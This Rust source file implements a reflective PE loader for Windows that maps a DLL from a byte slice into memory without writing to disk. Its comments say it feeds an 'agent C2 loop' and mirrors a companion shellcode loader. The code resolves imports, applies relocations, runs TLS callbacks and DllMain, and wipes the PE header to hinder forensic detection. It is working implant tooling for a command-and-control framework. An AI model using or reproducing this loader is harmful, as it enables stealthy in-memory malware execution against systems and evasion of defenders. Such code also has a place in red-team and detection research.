//! In-process reflective PE loader (Windows only).
//!
//! Loads a DLL from a raw byte slice directly into the current process memory
//! without touching disk.  Identical logic to shellcode/main.rs but uses
//! windows-sys bindings instead of PEB-walk API resolution, since we are
//! already inside a loaded PE with a functioning import table.
//!
//! Entry point: `load_and_run(pe_bytes)` — maps the DLL, resolves imports,
//! applies relocations, then calls the OEP as DllMain(DLL_PROCESS_ATTACH).
//! Blocks until the agent C2 loop exits (i.e. never under normal operation).

#![cfg(windows)]

use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect,
    MEM_COMMIT, MEM_RESERVE,
    PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
};
use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};
use windows_sys::Win32::Foundation::{HMODULE, FARPROC, BOOL};

// ── PE structure constants ────────────────────────────────────────────────────

const IMAGE_SCN_MEM_EXECUTE:           u32   = 0x2000_0000;
const IMAGE_SCN_MEM_WRITE:             u32   = 0x8000_0000;
const IMAGE_DIRECTORY_ENTRY_IMPORT:    usize = 1;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
const IMAGE_DIRECTORY_ENTRY_TLS:       usize = 9;
const IMAGE_REL_BASED_DIR64:           u16   = 10;
const DLL_PROCESS_ATTACH:              u32   = 1;

type FnDllMain     = unsafe extern "system" fn(*mut core::ffi::c_void, u32, *mut core::ffi::c_void) -> BOOL;
type FnTlsCallback = unsafe extern "system" fn(*mut core::ffi::c_void, u32, *mut core::ffi::c_void);

/// Load `pe` (raw DLL bytes) into the current process and call its entry point.
/// Returns `false` if the PE is malformed or any critical step fails.
pub unsafe fn load_and_run(pe: &[u8]) -> bool {
    // ── 1. Validate MZ + PE headers ──────────────────────────────────────────
    if pe.len() < 0x40 { return false; }
    if pe[0] != 0x4D || pe[1] != 0x5A { return false; } // "MZ"

    let e_lfanew = read_u32(pe, 0x3C) as usize;
    if e_lfanew + 0x108 > pe.len() { return false; }
    if pe[e_lfanew..e_lfanew+4] != [0x50, 0x45, 0x00, 0x00] { return false; } // "PE\0\0"

    // FILE_HEADER fields
    let n_sections   = read_u16(pe, e_lfanew + 0x06) as usize;
    let opt_hdr_size = read_u16(pe, e_lfanew + 0x14) as usize;

    // OPTIONAL_HEADER (PE32+)
    let opt = e_lfanew + 0x18;
    if read_u16(pe, opt) != 0x020B { return false; } // PE32+ magic
    let image_size   = read_u32(pe, opt + 0x38) as usize;
    let hdr_size     = read_u32(pe, opt + 0x3C) as usize;
    let preferred    = read_u64(pe, opt + 0x18) as usize;
    let oep_rva      = read_u32(pe, opt + 0x10) as usize;

    // Data directory array starts at opt + 0x70 (each entry = 8 bytes)
    let dd_off = opt + 0x70;

    // ── 2. Allocate image memory (RW, will set per-section protections later) ─
    let mut base = VirtualAlloc(
        preferred as *const core::ffi::c_void,
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) as usize;
    if base == 0 {
        base = VirtualAlloc(
            core::ptr::null::<core::ffi::c_void>(),
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        ) as usize;
    }
    if base == 0 { return false; }

    // ── 3. Copy headers ───────────────────────────────────────────────────────
    if hdr_size > pe.len() { return false; }
    core::ptr::copy_nonoverlapping(pe.as_ptr(), base as *mut u8, hdr_size);

    // ── 4. Copy sections ──────────────────────────────────────────────────────
    // Section table immediately follows the optional header in the file.
    let sec_table = e_lfanew + 0x18 + opt_hdr_size;
    for i in 0..n_sections {
        let s       = sec_table + i * 0x28;
        if s + 0x28 > pe.len() { break; }
        let v_addr  = read_u32(pe, s + 0x0C) as usize;
        let raw_sz  = read_u32(pe, s + 0x10) as usize;
        let raw_off = read_u32(pe, s + 0x14) as usize;
        if raw_sz == 0 { continue; }
        if raw_off + raw_sz > pe.len() { continue; }
        core::ptr::copy_nonoverlapping(
            pe.as_ptr().add(raw_off),
            (base + v_addr) as *mut u8,
            raw_sz,
        );
    }

    // ── 5. Apply base relocations ─────────────────────────────────────────────
    let reloc_rva  = read_u32(pe, dd_off + IMAGE_DIRECTORY_ENTRY_BASERELOC * 8    ) as usize;
    let reloc_size = read_u32(pe, dd_off + IMAGE_DIRECTORY_ENTRY_BASERELOC * 8 + 4) as usize;
    if reloc_rva != 0 && reloc_size != 0 {
        let delta  = base.wrapping_sub(preferred) as isize;
        let mut off = 0usize;
        while off + 8 <= reloc_size {
            let block_va   = read_u32_raw(base + reloc_rva + off    ) as usize;
            let block_size = read_u32_raw(base + reloc_rva + off + 4) as usize;
            if block_size < 8 { break; }
            let entries = (block_size - 8) / 2;
            for e in 0..entries {
                let entry = read_u16_raw(base + reloc_rva + off + 8 + e * 2);
                let kind  = entry >> 12;
                let roff  = (entry & 0x0FFF) as usize;
                if kind == IMAGE_REL_BASED_DIR64 {
                    let target = (base + block_va + roff) as *mut isize;
                    *target = (*target).wrapping_add(delta);
                }
            }
            off += block_size;
        }
    }

    // ── 6. Resolve imports ────────────────────────────────────────────────────
    let import_rva = read_u32(pe, dd_off + IMAGE_DIRECTORY_ENTRY_IMPORT * 8) as usize;
    if import_rva != 0 {
        let mut desc = base + import_rva;
        loop {
            let name_rva = read_u32_raw(desc + 0x0C) as usize;
            let iat_rva  = read_u32_raw(desc + 0x10) as usize;
            if name_rva == 0 && iat_rva == 0 { break; }

            let dll_name: *const u8 = (base + name_rva) as *const u8;
            let dll_base: HMODULE   = LoadLibraryA(dll_name);
            if dll_base != 0 {
                let orig_rva   = read_u32_raw(desc) as usize;
                let thunk_base = if orig_rva != 0 { orig_rva } else { iat_rva };
                let mut i = 0usize;
                loop {
                    let thunk_val = read_usize_raw(base + thunk_base + i * 8);
                    if thunk_val == 0 { break; }
                    let func: FARPROC = if thunk_val >> 63 != 0 {
                        GetProcAddress(dll_base, (thunk_val & 0xFFFF) as *const u8)
                    } else {
                        GetProcAddress(dll_base, (base + thunk_val + 2) as *const u8)
                    };
                    let iat_entry = (base + iat_rva + i * 8) as *mut usize;
                    *iat_entry = func.map_or(0, |f| f as usize);
                    i += 1;
                }
            }
            desc += 0x14; // sizeof IMAGE_IMPORT_DESCRIPTOR
        }
    }

    // ── 7. Per-section memory protections ─────────────────────────────────────
    let mut old: u32 = 0;
    for i in 0..n_sections {
        let s       = sec_table + i * 0x28;
        if s + 0x28 > pe.len() { break; }
        let v_addr  = read_u32(pe, s + 0x0C) as usize;
        let v_size  = read_u32(pe, s + 0x08) as usize;
        let raw_sz  = read_u32(pe, s + 0x10) as usize;
        let chars   = read_u32(pe, s + 0x24);
        let size    = v_size.max(raw_sz);
        if size == 0 { continue; }
        let prot = if chars & IMAGE_SCN_MEM_EXECUTE != 0 {
            if chars & IMAGE_SCN_MEM_WRITE != 0 { PAGE_EXECUTE_READWRITE } else { PAGE_EXECUTE_READ }
        } else {
            PAGE_READWRITE
        };
        VirtualProtect((base + v_addr) as *const core::ffi::c_void, size, prot, &mut old);
        let _ = old;
    }

    // ── 8. Wipe PE header from mapped image ───────────────────────────────────
    VirtualProtect(base as *const core::ffi::c_void, hdr_size.min(0x1000), PAGE_READWRITE, &mut old);
    core::ptr::write_bytes(base as *mut u8, 0, hdr_size.min(0x1000));
    VirtualProtect(base as *const core::ffi::c_void, hdr_size.min(0x1000), PAGE_READONLY, &mut old);
    let _ = old;

    // ── 9. TLS callbacks ──────────────────────────────────────────────────────
    let tls_rva = read_u32(pe, dd_off + IMAGE_DIRECTORY_ENTRY_TLS * 8) as usize;
    if tls_rva != 0 {
        // TLS directory: AddressOfCallbacks is at offset 0x18 (VA, not RVA)
        let cb_va = read_u64_raw(base + tls_rva + 0x18) as usize;
        if cb_va != 0 {
            let mut p = cb_va;
            loop {
                let cb_addr = read_usize_raw(p);
                if cb_addr == 0 { break; }
                let cb: FnTlsCallback = core::mem::transmute(cb_addr);
                cb(base as *mut core::ffi::c_void, DLL_PROCESS_ATTACH, core::ptr::null_mut());
                p += 8;
            }
        }
    }

    // ── 10. Call entry point ──────────────────────────────────────────────────
    if oep_rva != 0 {
        let entry: FnDllMain = core::mem::transmute(base + oep_rva);
        entry(base as *mut core::ffi::c_void, DLL_PROCESS_ATTACH, core::ptr::null_mut());
    }

    true
}

// ── safe slice readers (bounds-checked) ──────────────────────────────────────

#[inline] fn read_u16(buf: &[u8], off: usize) -> u16 {
    u16::from_le_bytes(buf[off..off+2].try_into().unwrap_or([0;2]))
}
#[inline] fn read_u32(buf: &[u8], off: usize) -> u32 {
    u32::from_le_bytes(buf[off..off+4].try_into().unwrap_or([0;4]))
}
#[inline] fn read_u64(buf: &[u8], off: usize) -> u64 {
    u64::from_le_bytes(buf[off..off+8].try_into().unwrap_or([0;8]))
}

// ── raw memory readers (unsafe, no bounds check) ─────────────────────────────

#[inline] unsafe fn read_u16_raw(addr: usize) -> u16 { *(addr as *const u16) }
#[inline] unsafe fn read_u32_raw(addr: usize) -> u32 { *(addr as *const u32) }
#[inline] unsafe fn read_u64_raw(addr: usize) -> u64 { *(addr as *const u64) }
#[inline] unsafe fn read_usize_raw(addr: usize) -> usize { *(addr as *const usize) }
